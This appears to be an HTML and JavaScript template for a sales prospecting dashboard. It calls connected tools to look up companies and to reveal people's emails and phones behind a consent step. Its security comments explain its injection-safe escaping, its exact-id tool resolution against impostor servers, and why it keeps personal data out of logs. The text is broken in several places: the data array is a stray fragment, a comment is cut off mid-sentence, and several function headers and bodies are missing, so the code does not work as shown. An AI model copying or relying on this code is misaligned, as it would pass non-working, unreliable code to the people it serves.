<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- This document holds callMcpTool, so injected markup here is not a defacement
     but a route to a connected tool. The policy below is deliberately partial:
     no default-src, because the cowork bridge's transport is host-defined and a
     blanket connect-src would silently kill every reveal. What it does buy is
     the two channels injected markup would actually reach for: a remotely
     loaded script, and an image request beaconing the board off-origin. Inline
     script and style stay allowed because the whole template is one file. -->
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; object-src 'none'; base-uri 'none'; form-action 'none'">
<title>My Plan</title>
<style>
  :root{ color-scheme: light;
    --navy:#043349; --navy-dark:#02222f; --navy-soft:#e4eef2;
    --ink:#0f1f26; --muted:#5c6f77; --line:#e3e9eb; --bg:#f5f8f9; --card:#ffffff;
    --accent:#0f7a68; --accent-soft:#e2f1ee;
    --hot:#b3261e; --hot-soft:#fdeaea;
    --warm:#8a5a00; --warm-soft:#fdf2dc;
    --cool:#4a5b62; --cool-soft:#eceff0;
    --violet:#5b3fbf; --violet-soft:#eee9fc;
    --ok:#1a7f37; --ok-soft:#e6f6ea;
  }
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;
       background:var(--bg);color:var(--ink);padding:20px 3vw 60px;font-size:14px}
  a{color:var(--navy)}
  header{display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:12px;margin-bottom:12px}
  h1{font-size:23px;letter-spacing:-.3px;color:var(--navy)}
  .sub{color:var(--muted);font-size:12.5px;margin-top:3px}
  .top-actions{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
  .btn{border:1px solid var(--line);background:#fff;border-radius:9px;padding:8px 13px;
       font-size:12.5px;font-weight:600;cursor:pointer;color:var(--ink);font-family:inherit}
  .btn.primary{background:var(--navy);border-color:var(--navy);color:#fff}
  .btn.ghost{background:transparent}
  .btn:hover:not(:disabled){filter:brightness(.96)}
  .btn:disabled{opacity:.5;cursor:not-allowed}
  .banner{background:var(--warm-soft);border:1px solid #e6cd94;color:#6b4a05;border-radius:10px;
          padding:10px 14px;margin-bottom:14px;font-size:12.5px;font-weight:600}
  .profile{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:11px 15px;
           margin-bottom:14px;display:flex;flex-wrap:wrap;gap:18px;font-size:12.5px}
  .profile b{display:block;font-size:10px;text-transform:uppercase;letter-spacing:.06em;
             color:var(--muted);margin-bottom:2px;font-weight:700}
  .kpis{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:14px}
  .kpi{background:var(--card);border:1px solid var(--line);border-radius:11px;padding:11px 16px;min-width:112px}
  .kpi .n{font-size:21px;font-weight:700;color:var(--navy)}
  .kpi .l{font-size:11px;color:var(--muted);margin-top:1px}
  .controls{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:18px}
  .chip-f{font-size:11.5px;font-weight:600;padding:5px 11px;border-radius:999px;cursor:pointer;
          background:var(--card);border:1px solid var(--line);color:var(--muted)}
  .chip-f.on{background:var(--navy);border-color:var(--navy);color:#fff}
  .search{padding:7px 11px;border:1px solid var(--line);border-radius:9px;font-size:12.5px;
          min-width:200px;font-family:inherit}
  .tier-h{font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:.08em;
          color:var(--muted);margin:20px 0 9px}
  .account{background:var(--card);border:1px solid var(--line);border-radius:14px;margin-bottom:16px;overflow:hidden}
  .acct-head{display:flex;align-items:center;gap:13px;padding:15px 18px 9px;flex-wrap:wrap}
  .rank{width:29px;height:29px;border-radius:8px;background:var(--navy);color:#fff;display:flex;
        align-items:center;justify-content:center;font-weight:700;font-size:13px;flex:none}
  .acct-name{font-size:16px;font-weight:700}
  .acct-meta{font-size:11.5px;color:var(--muted);margin-top:1px}
  .fit{margin-left:auto;text-align:right;cursor:pointer;background:none;border:none;font-family:inherit}
  .fit .pct{font-size:20px;font-weight:800;color:var(--navy)}
  .fit .bar{width:104px;height:5px;border-radius:3px;background:var(--line);margin-top:3px}
  .fit .bar i{display:block;height:5px;border-radius:3px;background:var(--navy)}
  .fit .hint{font-size:9.5px;color:var(--muted);margin-top:3px}
  .pill{display:inline-block;padding:2px 8px;border-radius:999px;font-size:10px;font-weight:800;
        letter-spacing:.04em;vertical-align:2px;margin-left:7px}
  .act-now{background:var(--hot-soft);color:var(--hot)}
  .build{background:var(--warm-soft);color:var(--warm)}
  .watch{background:var(--cool-soft);color:var(--cool)}
  .glance{margin:3px 18px 10px;padding:11px 13px;background:var(--navy-soft);border-radius:10px;
          font-size:13px;line-height:1.55;color:#0b3141}
  .glance b{color:var(--navy)}
  .scoredims{display:none;margin:0 18px 10px;padding:11px 13px;background:var(--bg);
             border:1px solid var(--line);border-radius:10px}
  .scoredims.open{display:block}
  .sd-row{display:flex;align-items:center;gap:9px;font-size:11.5px;margin-bottom:5px}
  .sd-row .sd-l{width:230px;color:var(--muted);flex:none}
  .sd-row .sd-bar{flex:1;height:5px;border-radius:3px;background:var(--line)}
  .sd-row .sd-bar i{display:block;height:5px;border-radius:3px;background:var(--navy)}
  .sd-row .sd-v{width:44px;text-align:right;font-weight:700}
  .sd-null{color:var(--muted);font-style:italic;font-weight:400}
  .chips{display:flex;gap:5px;flex-wrap:wrap;margin:0 18px 9px;align-items:center}
  .chips .lbl{font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;
              color:var(--muted);margin-right:2px}
  .chip{font-size:11px;font-weight:600;padding:3px 9px;border-radius:999px;background:var(--cool-soft);color:var(--cool)}
  .chip.layer{background:var(--violet-soft);color:var(--violet)}
  .chip.t-cover{background:var(--navy-soft);color:var(--navy)}
  .chip.t-open{background:#fff;border:1px dashed var(--line);color:var(--muted)}
  details{border-top:1px solid var(--line)}
  summary{cursor:pointer;padding:10px 18px;font-size:12.5px;font-weight:600;color:var(--navy);list-style:none}
  summary::before{content:'\25B8  ';font-size:9px}
  details[open] summary::before{content:'\25BE  '}
  .why{padding:2px 18px 15px;display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:9px}
  .ev{background:var(--bg);border:1px solid var(--line);border-radius:10px;padding:10px 12px;font-size:12px;line-height:1.5}
  .ev .tag{font-size:9.5px;font-weight:800;text-transform:uppercase;letter-spacing:.05em;
           color:var(--navy);display:block;margin-bottom:4px}
  .ev q{font-style:italic;color:#2b3b41}
  .ev .src{display:block;margin-top:5px;color:var(--muted);font-size:10.5px}
  .plist{padding:11px 18px 16px;display:grid;grid-template-columns:repeat(auto-fill,minmax(272px,1fr));
         gap:9px;border-top:1px solid var(--line)}
  .pcard{border:1px solid var(--line);border-radius:11px;padding:11px 13px;background:#fff;
         cursor:pointer;position:relative;text-align:left;font-family:inherit;font-size:inherit;width:100%}
  .pcard:hover{box-shadow:0 4px 13px rgba(4,51,73,.11)}
  .pcard.tbd{background:var(--bg);border-style:dashed;cursor:default}
  .pname{font-weight:700;font-size:13.5px;color:var(--ink)}
  .ptitle{font-size:11.5px;color:var(--muted);margin:2px 0 7px;line-height:1.35}
  .badges{display:flex;gap:4px;flex-wrap:wrap}
  .b{font-size:9px;font-weight:800;padding:2px 6px;border-radius:999px;letter-spacing:.04em}
  .b-p{background:var(--navy-soft);color:var(--navy)}
  .b-key{background:var(--accent-soft);color:var(--accent)}
  .b-sig{background:var(--hot-soft);color:var(--hot)}
  .b-warm{background:var(--warm-soft);color:var(--warm)}
  .b-enr{background:var(--ok-soft);color:var(--ok)}
  .b-mis{background:var(--cool-soft);color:var(--cool)}
  .b-evt{background:var(--violet-soft);color:var(--violet)}
  .psig{margin-top:8px;font-size:11px;background:var(--hot-soft);border-radius:7px;padding:7px 9px;
        color:#7a2520;line-height:1.45}
  .psig b{font-size:9px;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:2px;color:var(--hot)}
  .pc-x{position:absolute;top:6px;right:7px;border:none;background:transparent;color:#c3cbce;
        font-size:13px;cursor:pointer;line-height:1;padding:2px 5px;border-radius:5px}
  .pc-x:hover{background:var(--hot-soft);color:var(--hot)}
  .acct-actions{display:flex;gap:8px;padding:0 18px 15px;flex-wrap:wrap;align-items:center}
  .err{margin:0 18px 12px;padding:9px 12px;border-radius:9px;font-size:11.5px;line-height:1.45;display:none}
  .err.show{display:block}
  .err.perm{background:var(--cool-soft);color:var(--cool)}
  .err.temp{background:var(--hot-soft);color:var(--hot)}
  .empty{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:26px 22px;text-align:center}
  .empty h2{font-size:16px;margin-bottom:7px;color:var(--navy)}
  .empty p{font-size:13px;color:var(--muted);line-height:1.6;max-width:560px;margin:0 auto}
  .overlay{position:fixed;inset:0;background:rgba(4,51,73,.45);display:none;align-items:flex-start;
           justify-content:center;padding:5vh 16px;z-index:50;overflow:auto}
  .overlay.open{display:flex}
  .modal{background:#fff;border-radius:14px;max-width:660px;width:100%;padding:20px 22px;
         box-shadow:0 20px 60px rgba(0,0,0,.25)}
  .m-close{float:right;border:none;background:var(--cool-soft);border-radius:7px;width:27px;height:27px;
           cursor:pointer;font-size:14px;color:var(--muted)}
  .m-name{font-size:18px;font-weight:800}
  .m-title{font-size:12.5px;color:var(--muted);margin:3px 0 11px}
  .m-grid{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:11px}
  .m-cell{background:var(--bg);border:1px solid var(--line);border-radius:9px;padding:9px 11px;font-size:12.5px}
  .m-cell b{display:block;font-size:9.5px;text-transform:uppercase;letter-spacing:.05em;
            color:var(--muted);margin-bottom:3px}
  .m-cell a{word-break:break-all}
  .m-warm{background:var(--warm-soft);border-radius:9px;padding:9px 11px;font-size:12.5px;
          margin-bottom:11px;color:#6b4a05;line-height:1.5}
  .m-warm b{font-size:9.5px;text-transform:uppercase;letter-spacing:.05em;display:block;
            margin-bottom:3px;color:var(--warm)}
  .m-sig{background:var(--hot-soft);border-radius:9px;padding:9px 11px;font-size:12.5px;
         margin-bottom:10px;color:#5f1d18;line-height:1.55}
  .m-sig b{font-size:9.5px;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:4px;color:var(--hot)}
  .m-sig .sq{font-style:italic}
  .m-sig .sd{color:#8a5a56;font-size:10.5px;display:block;margin-top:3px}
  .sec-h{font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;
         color:var(--muted);margin:12px 0 6px}
  .pt{display:flex;gap:8px;font-size:12px;line-height:1.5;margin-bottom:4px;color:#25322f}
  .pt::before{content:'\25CF';color:var(--navy);font-size:7px;line-height:2.3}
  .m-mail{border:1px solid var(--line);border-radius:10px;background:#fbfdfd;padding:13px 15px;
          font-size:12.5px;line-height:1.6;margin-bottom:12px}
  .m-mail .eh{font-size:9.5px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;
              color:var(--navy);margin-bottom:6px}
  .m-mail .subj{font-weight:700;margin-bottom:7px}
  .m-actions{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
  .swap-input{display:none;margin-top:8px}
  .swap-input.open{display:block}
  .swap-input input{width:100%;padding:9px 11px;border:1px solid var(--line);border-radius:9px;
                    font-size:13px;margin-bottom:8px;font-family:inherit}
  .match-card{border:1px solid var(--line);border-radius:10px;padding:12px 14px;background:var(--bg);
              line-height:1.6;margin-top:11px;font-size:12.5px}
  .c-people{border:1px solid var(--line);border-radius:10px;background:var(--bg);padding:9px 12px;
            margin:11px 0;max-height:190px;overflow:auto}
  .c-people div{font-size:12.5px;line-height:1.6}
  .c-people div span{color:var(--muted)}
  .c-cost{background:var(--navy-soft);border-radius:9px;padding:10px 12px;font-size:12.5px;
          line-height:1.55;color:#0b3141;margin-bottom:12px;white-space:pre-wrap}
  .spin{display:inline-block;width:13px;height:13px;border:2px solid var(--line);
        border-top-color:var(--navy);border-radius:50%;animation:sp 1s linear infinite;
        vertical-align:-2px;margin-right:6px}
  @keyframes sp{to{transform:rotate(360deg)}}
  .toast{position:fixed;bottom:20px;right:20px;background:var(--ink);color:#fff;padding:11px 16px;
         border-radius:10px;font-size:12.5px;opacity:0;transition:opacity .3s;pointer-events:none;
         z-index:99;max-width:340px;line-height:1.45}
  .toast.show{opacity:1}
  .note{font-size:11px;color:var(--muted)}
  footer{margin-top:28px;font-size:11px;color:var(--muted);line-height:1.7;
         border-top:1px solid var(--line);padding-top:13px}
</style>
</head>
<body>

<div class="banner" id="example-banner" hidden>
  Example data. This is the template fixture, not a real plan.
</div>

<header>
  <div>
    <h1 id="page-title">My Plan</h1>
    <div class="sub" id="subline"></div>
  </div>
  <div class="top-actions">
    <button class="btn primary" id="btn-csv">Download this week (CSV)</button>
    <button class="btn" id="btn-crm" disabled>Send to CRM</button>
    <span class="note" id="crm-note"></span>
  </div>
</header>

<div class="profile" id="profile"></div>

<div class="kpis" id="kpis"></div>

<div class="controls">
  <span class="chip-f on" data-filter="all">All</span>
  <span class="chip-f" data-filter="warm">Has a warm path</span>
  <span class="chip-f" data-filter="signal">Has a live signal</span>
  <input class="search" id="search" placeholder="Search accounts, people, titles">
</div>

<div id="board"></div>

<footer id="footer"></footer>

<div class="overlay" id="p-overlay"><div class="modal" id="p-modal"></div></div>

<div class="overlay" id="s-overlay">
  <div class="modal">
    <button class="m-close" id="s-close">&#10005;</button>
    <div class="m-name">Swap this account</div>
    <div class="m-title">Replacing <span id="s-target"></span>. Check a company you have in mind.</div>
    <div class="swap-input open">
      <input id="s-domain" placeholder="Company name or domain">
      <button class="btn primary" id="s-run">Check this company</button>
    </div>
    <div id="s-result"></div>
    <div class="err" id="err-swap"></div>
  </div>
</div>

<!-- Consent gate for a bulk reveal. Nothing is pulled until the rep approves
     what this modal states. Above the server's threshold the cost line is
     replaced with the server's own wording, verbatim. -->
<div class="overlay" id="c-overlay">
  <div class="modal">
    <button class="m-close" id="c-close">&#10005;</button>
    <div class="m-name" id="c-title">Reveal contact data</div>
    <div class="m-title" id="c-sub"></div>
    <div class="c-people" id="c-people"></div>
    <div class="c-cost" id="c-cost"></div>
    <div class="err" id="err-confirm"></div>
    <div class="m-actions">
      <button class="btn primary" id="c-go" disabled>Reveal</button>
      <button class="btn ghost" id="c-cancel">Cancel</button>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
/* ------------------------------------------------------------------ *
 * Environment shims. Present in every copy so the same markup opens
 * standalone, where live controls degrade instead of throwing. Keep
 * the message neutral: whoever the rep forwards this to will read it.
 * ------------------------------------------------------------------ */
if (typeof window !== 'undefined' && typeof window.cowork === 'undefined') {
  window.cowork = { callMcpTool: async function () {
    throw new Error('Live actions run inside your workspace');
  }};
}
if (typeof window !== 'undefined' && typeof window.storage === 'undefined') {
  window.storage = { get: async function () { return null; }, set: async function () {} };
}

/* ------------------------------------------------------------------ *
 * Injected at render time. Never hardcode a tenant's values here, and
 * never embed a connector id: substitute the fully-qualified tool

 * signal, not a bug -- its control renders disabled with a reason.
 * ------------------------------------------------------------------ */
const DISPLAY_NAME = "__DISPLAY_NAME__";
const WEEK_LABEL   = "__WEEK_LABEL__";

const TOOLS = {
  match_company:           "__TOOL_MATCH_COMPANY__",
  contact_data_enrichment: "__TOOL_CONTACT_ENRICHMENT__",
  ai_prospecting:          "__TOOL_AI_PROSPECTING__"
};
const ENRICH_TENANT_ID = null;

/* Set false when DATA is replaced with a real run. */
const IS_EXAMPLE_DATA = true;

/* ------------------------------------------------------------------ *
 * DATA -- see references/data-contract.md for the field-by-field
 * contract. The fixture below is synthetic: placeholder-register names
 * and namespaced example profile handles. Replace it wholesale.
 * ------------------------------------------------------------------ */
const DATA = [

     signal:{d:"12 Jul 2026 · account signal", q:"“We still have no clean way to see who can read which tables. Every audit turns into a week of spreadsheet archaeology.”", why:"Her org owns the gap, and the seat that used to own it is still empty."},

function escHtml(value){
  return String(value == null ? '' : value)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
/* `glance` and `mail.b` are the only two fields the data contract lets the agent
   author as markup, and the contract's allowance is narrow: <b> and <br>, no
   other tags, no attributes. Escape everything, then re-admit exactly those two
   -- an allowlist, so a hostile CRM field or community message that the model
   echoed into either one cannot open a tag it was not granted. Never widen this
   to a blocklist; the fields it guards share a document with callMcpTool. */
function escRich(value){
  return escHtml(value)
    .replace(/&lt;(\/?)b&gt;/gi, '<$1b>')
    .replace(/&lt;br\s*\/?&gt;/gi, '<br>');
}
/* The redaction floor for every diagnostic in this file: shapes, never values.
   Key names tell you which parser branch missed; the values behind them are a
   person's email and phone number. Log the former, never the latter. */
function fieldNames(value){
  if (value == null) return [];
  if (Array.isArray(value)) return ['[array:' + value.length + ']'];
  if (typeof value !== 'object') return ['[' + typeof value + ']'];
  return Object.keys(value);
}
function isPlaceholder(value){ return /^__[A-Z_]+__$/.test(String(value || '')); }
function clean(list){ return (Array.isArray(list) ? list : []).filter(function(v){ return !isPlaceholder(v); }); }

function unwrap(res){

    ? res.structuredContent : res;

      typeof payload.content[0].text === 'string') {
    try { payload = JSON.parse(payload.content[0].text); }
    catch (e) { return { text: payload.content[0].text }; }
  }
  for (var i = 0; i < 3 && payload && typeof payload.result === 'string'; i++) {
    try { payload = JSON.parse(payload.result); } catch (e) { break; }
  }
  if (payload && payload.isError) throw new Error(payload.error || 'the tool reported an error');
  return payload;
}

  if (!payload) return [];
  var candidate = payload.rows || payload.results || payload.prospects || payload.data || payload.items;
  return Array.isArray(candidate) ? candidate : [];
}

/* Field lookup is case-insensitive and unwraps a single-element array,
   because the same value arrives as `email`, `EMAIL` and `emails[0]`
   depending on which side of the pipeline answered. A chain that only
   checks lowercase reads a populated row as empty, which is
   indistinguishable from "no contact data exists" to the rep. */
function pickField(row, names){
  if (!row || typeof row !== 'object') return null;
  var keys = Object.keys(row);
  for (var n = 0; n < names.length; n++) {
    for (var k = 0; k < keys.length; k++) {
      if (keys[k].toLowerCase() !== names[n]) continue;
      var value = row[keys[k]];
      if (Array.isArray(value)) value = value[0];
      if (value === null || value === undefined) continue;
      value = String(value).trim();
      if (value) return value;
    }
  }
  return null;
}

   arrives: lowercase, no scheme, no leading www., no query or fragment, no
   trailing slash. Used to map returned rows back to the right person. */
function normalizeLi(value){
  return String(value == null ? '' : value)
    .trim().toLowerCase()
    .replace(/^https?:\/\//, '')
    .replace(/^www\./, '')
    .replace(/[?#].*$/, '')
    .replace(/\/+$/, '');
}

/* Enrichment is asynchronous. When a run outlives its poll window the server
   answers {status:"still_running", continuation_token} and the SAME call is
   repeated with that token to resume the SAME run — it is not a second run
   and not a second charge.

   Every enrichment call goes through here, because a still_running response
   carries no rows: read naively it looks exactly like "this person has no
   contact data", which is how a profile with a verified email came back as
   "none found". A pending answer is not a negative one. */
var ENRICH_POLL_LIMIT = 15;
var ENRICH_POLL_DELAY_MS = 3000;

/* This pause is the server's instruction ("wait a few seconds between
   calls"), not decoration. It is the one sleep in this file that is not
   simulated latency: the run really is still going, and hammering it just
   exhausts the attempt budget in a few milliseconds and reports a timeout
   the rep did not have. */
function wait(ms){ return new Promise(function(resolve){ setTimeout(resolve, ms); }); }

async function callEnrichment(args, onWait){
  var pending = args;
  for (var attempt = 0; attempt < ENRICH_POLL_LIMIT; attempt++) {
    var payload = await callTool('contact_data_enrichment', pending);
    if (!payload || payload.status !== 'still_running') return payload;
    if (!payload.continuation_token) break;
    if (onWait) onWait(attempt + 1);
    pending = {};
    for (var key in args) if (args.hasOwnProperty(key)) pending[key] = args[key];
    pending.continuation_token = payload.continuation_token;
    if (ENRICH_POLL_DELAY_MS) await wait(ENRICH_POLL_DELAY_MS);
  }
  throw new Error('the contact data provider is still working — try again in a moment');
}

/* Applies one result row to one person and returns whether anything was found.
   Shared by the per-person and bulk paths so the two cannot drift on which
   field names count, which badges get set, or what "found" means. */
function applyContactRow(person, row){
  var email = pickField(row, ['email','work_email','professional_email','business_email',
                              'email_address','emails']);
  var phone = pickField(row, ['phone','mobile_phone','phone_number','direct_phone',
                              'mobile','phones']);
  var found = !!(email || phone);
  person.email = email;
  person.phone = phone;
  person.checked = true;
  setBadge(person, 'enr', found);
  setBadge(person, 'mis', !found);
  return found;
}

function ToolUnavailable(shortName){
  this.name = 'ToolUnavailable';
  this.shortName = shortName;
  this.message = 'not connected in this workspace';
}
ToolUnavailable.prototype = Object.create(Error.prototype);

/* Exact identity, or nothing. This used to fall back to scanning the ambient
   tool list for any name ending in the short name, to survive a connector id
   that went stale between renders. That fallback trusted the wrong thing: the
   short names are guessable, so any other server in the workspace -- installed
   for unrelated reasons, or hostile -- could register `<anything>__contact_data_
   enrichment` and be handed a rep's prospect list, or answer with forged
   enrichment. A stale id is a render-time problem with a render-time fix (the
   plan is rebuilt weekly); a substituted impostor is not recoverable.
   So: only what the agent explicitly wrote into TOOLS, and only if it still
   looks like the tool it claims to be -- a mis-pasted id fails closed too.
   Failing closed is already a designed state: the affected control renders
   disabled with "Not connected here -- ask in chat." */
function resolveTool(shortName){
  var injected = TOOLS[shortName];
  if (!injected || isPlaceholder(injected)) return null;
  var id = String(injected);
  var tail = '__' + shortName;
  var at = id.lastIndexOf(tail);
  var qualified = at >= 0 && at + tail.length === id.length;
  return (id === shortName || qualified) ? id : null;
}
function toolAvailable(shortName){ return resolveTool(shortName) !== null; }

async function callTool(shortName, args){
  var id = resolveTool(shortName);
  if (!id) throw new ToolUnavailable(shortName);
  if (typeof window === 'undefined' || !window.cowork ||
      typeof window.cowork.callMcpTool !== 'function') throw new ToolUnavailable(shortName);
  return unwrap(await window.cowork.callMcpTool(id, args));
}

function showError(slotId, message, permanent){
  var slot = document.getElementById(slotId);
  if (!slot) return;
  slot.textContent = message;
  slot.className = 'err show ' + (permanent ? 'perm' : 'temp');
}
function clearError(slotId){
  var slot = document.getElementById(slotId);
  if (slot) { slot.className = 'err'; slot.textContent = ''; }
}
async function guard(slotId, fn){
  clearError(slotId);
  try { return await fn(); }
  catch (err) {
    console.error(err);
    var permanent = err && err.name === 'ToolUnavailable';
    showError(slotId, permanent
      ? 'That action is not connected in this workspace. Ask in chat instead.'
      : ('That did not work just now: ' + (err && err.message ? err.message : 'unknown error') + '. You can try again.'),
      permanent);
    return null;
  }
}

function toast(message){
  var el = document.getElementById('toast');
  el.textContent = message;
  el.classList.add('show');
  clearTimeout(el._timer);
  el._timer = setTimeout(function(){ el.classList.remove('show'); }, 3600);
}

/* Buffer writes go to window.storage, never localStorage. The next run
   drains them into the state file, which is the source of truth.

   This throws rather than swallowing. It used to catch its own errors and
   return normally, so a caller could await it, see no error, and toast
   "saved" over a write that never landed. A failed write has to be visible
   to the caller or the toast lies. */
const BUFFER_KEY = 'plan-buffer';

async function readBuffer(){
  var current = (await window.storage.get(BUFFER_KEY)) || [];
  return Array.isArray(current) ? current : [];
}

async function buffer(kind, payload){
  var current = await readBuffer();
  current.push({ kind: kind, payload: payload });
  await window.storage.set(BUFFER_KEY, current);
  return true;
}

/* For writes that trail an action the rep can already see on screen: the
   action stands, but we say plainly that it was not recorded rather than
   letting it silently return next Monday. Actions whose entire product IS
   the write go through guard() instead, so failure reads as failure. */
async function bufferOrWarn(kind, payload, slotId){
  try { return await buffer(kind, payload); }
  catch (err) {
    console.error('buffer write failed', err);
    if (slotId) showError(slotId,
      'Done on screen, but we could not record it for next week — it may come back.', false);
    return false;
  }
}

/* ------------------------------------------------------------------ *

function normalizePersona(person){
  var p = person || {};
  var revealed = !!(p.email || p.phone);
  var checked = revealed || !!p.checked;
  var badges = (Array.isArray(p.badges) ? p.badges : []).filter(function(b){ return BADGES[b]; });
  if (revealed && badges.indexOf('enr') === -1) badges.push('enr');
  if (checked && !revealed && badges.indexOf('mis') === -1) badges.push('mis');
  var signal = p.signal || {};
  return {
    name: p.name || 'Unnamed contact',
    title: p.title || '',
    loc: p.loc || '',
    p: p.p || 'CONTACT',
    badges: badges,
    email: p.email || null,
    phone: p.phone || null,
    /* Runtime only, never authored into DATA. Separates "we asked and got
       nothing" from "nobody has asked yet" — identical states on the board
       before this existed, which made a miss look like an untouched card. */
    checked: checked,
    li: p.li || '',
    warm: p.warm || null,
    signal: { d: signal.d || '', q: signal.q || '', why: signal.why || '' },
    points: Array.isArray(p.points) ? p.points : [],
    why: p.why || '',

function normalizeAccount(account){

    covered: Array.isArray(a.covered) ? a.covered : [],

function matchesFilters(account){
  if (activeFilter === 'warm' && !account.personas.some(function(p){ return p.warm; })) return false;
  if (activeFilter === 'signal' && !account.evidence.length) return false;
  if (!searchTerm) return true;
  var haystack = [account.name, account.meta,
    account.personas.map(function(p){ return p.name + ' ' + p.title; }).join(' ')
  ].join(' ').toLowerCase();

/* ------------------------------------------------------------------ *
 * Capability probe. Runs at render, not at click: showing a rep the
 * truth up front beats letting them discover it by pressing a button.
 * ------------------------------------------------------------------ */
function applyCapabilities(){
  var canSwap = toolAvailable('match_company');
  document.querySelectorAll('[data-swap]').forEach(function(btn){
    btn.disabled = !canSwap;
    if (!canSwap) btn.title = 'Company lookup is not connected in this workspace. Ask in chat.';
  });
  /* The bulk control makes a real, paid call now, so it is gated like every
     other live control: disabled with a reason rather than failing on click. */
  var canReveal = toolAvailable('contact_data_enrichment');
  document.querySelectorAll('[data-request]').forEach(function(btn){
    btn.disabled = !canReveal;
    if (!canReveal) btn.title = 'Contact data is not connected in this workspace. Ask in chat.';
  });
  var crmNote = document.getElementById('crm-note');
  crmNote.textContent = 'CRM writes run from chat, confirmed one record at a time.';
  document.getElementById('btn-crm').title = crmNote.textContent;
}

/* ------------------------------------------------------------------ *
 * Actions. Nothing here runs on load.
 * ------------------------------------------------------------------ */
async function revealContact(ai, pi){
  var account = BOARD[ai];
  var person = account.personas[pi];
  var slot = 'err-p-' + ai + '-' + pi;
  var button = document.getElementById('reveal-' + ai + '-' + pi);
  if (button) { button.disabled = true; button.innerHTML = '<span class="spin"></span>Revealing…'; }

  var result = await guard(slot, async function(){
    return await callEnrichment(enrichArgs(
      [contactPayload(account, person)],
      'Rep clicked to reveal one contact from their weekly plan'), function(){
      if (button) button.innerHTML = '<span class="spin"></span>Still working…';
    });
  });

  if (result === null) {
    if (button) { button.disabled = false; button.textContent = restoreLabel(person); }
    return;
  }

  var row = firstRow(result);
  var found = applyContactRow(person, row);
  var email = person.email;
  var phone = person.phone;

  /* A miss is the case worth being able to debug later: the tool answers for
     this profile from chat, so an empty read here is either a provider miss
     or a shape this parser does not recognise. Logging the payload told those
     apart -- and put emails, phones and profile ids into a console the rep
     does not know is recording. The field names separate the two cases just as
     well, and carry no personal data: a provider miss returns the keys with
     empty values, an unrecognised shape returns keys this parser never reads. */
  if (!found) console.log('contact_data_enrichment returned no contact values',
    { person: person.li, responseFields: fieldNames(row), rowPresent: !!row });

  var emailEl = document.getElementById('em-' + ai + '-' + pi);
  var phoneEl = document.getElementById('ph-' + ai + '-' + pi);
  if (emailEl) emailEl.innerHTML = email
    ? '<a href="mailto:' + escHtml(email) + '">' + escHtml(email) + '</a>'
    : '<span class="note">Checked — none found</span>';
  if (phoneEl) phoneEl.innerHTML = phone
    ? escHtml(phone) : '<span class="note">Checked — none found</span>';

  /* Only a hit retires the control. Removing it on a miss stranded the rep:
     the only way back was closing and reopening the modal, which nothing on
     screen suggested. A miss can be a transient provider gap, so the retry
     stays one click away — an explicit one, because the pull is paid and an
     automatic retry would double the spend on the rep's behalf. */
  if (button) {
    if (found) button.remove();
    else {
      button.disabled = false;
      button.className = 'btn';
      button.textContent = 'None found — try again';
    }
  }

  await bufferOrWarn(found ? 'revealed' : 'reveal_miss',
    { account: account.id, person: person.li }, slot);
  toast(found ? 'Contact data revealed for ' + person.name
              : 'No verified contact data found for ' + person.name + '. You can try again.');
  render();
}

function restoreLabel(person){
  return person.checked ? 'None found — try again' : 'Reveal contact data';
}

function setBadge(person, key, on){
  var at = person.badges.indexOf(key);
  if (on && at === -1) person.badges.push(key);
  if (!on && at !== -1) person.badges.splice(at, 1);
}

/* ------------------------------------------------------------------ *
 * Bulk reveal. The artifact enriches directly, but never before the rep
 * has seen what will be pulled and what it costs and said yes.
 *
 * Two tiers, because the server has two. At or under its threshold there
 * is no server consent step to show, so the modal states the cost in its
 * own words. Above it, the server owns the wording: phase 1 returns a
 * `user_facing_message` that is rendered VERBATIM via textContent and
 * never paraphrased, and approval sends batches carrying its token.
 *
 * What this replaces: a button that recorded the selection and told the
 * rep to ask in chat. That deferral bought friction rather than consent —
 * the same people revealed one at a time cost the same and passed no gate
 * at all. A real gate is both safer and less work for the rep.
 * ------------------------------------------------------------------ */
const CONSENT_THRESHOLD = 10;
const DEFAULT_BATCH = 20;
var CONFIRM = null;

function closeConfirm(){
  document.getElementById('c-overlay').classList.remove('open');
  CONFIRM = null;
}

async function openRevealAll(ai){
  var account = BOARD[ai];
  var people = pendingContacts(account);
  if (!people.length) return;

  CONFIRM = { ai: ai, people: people, token: null, batch: DEFAULT_BATCH,
              total: people.length, ready: false };

  document.getElementById('c-title').textContent =
    'Reveal contact data for ' + people.length + ' ' +
    (people.length === 1 ? 'person' : 'people') + '?';
  document.getElementById('c-sub').textContent = account.name;
  document.getElementById('c-people').innerHTML = people.map(function(p){
    return '<div>' + escHtml(p.name) +
      (p.title ? ' <span>· ' + escHtml(p.title) + '</span>' : '') + '</div>';
  }).join('');
  clearError('err-confirm');

  var go = document.getElementById('c-go');
  var cost = document.getElementById('c-cost');
  go.textContent = 'Yes, reveal ' + people.length;
  document.getElementById('c-overlay').classList.add('open');

  if (people.length <= CONSENT_THRESHOLD) {
    /* No server consent step at this tier, so this wording is ours — and it
       follows the server's own rule for consent copy: frame it as volume,
       never as cost, credits or billing. Above the threshold the server
       supplies the wording and we show it untouched. */
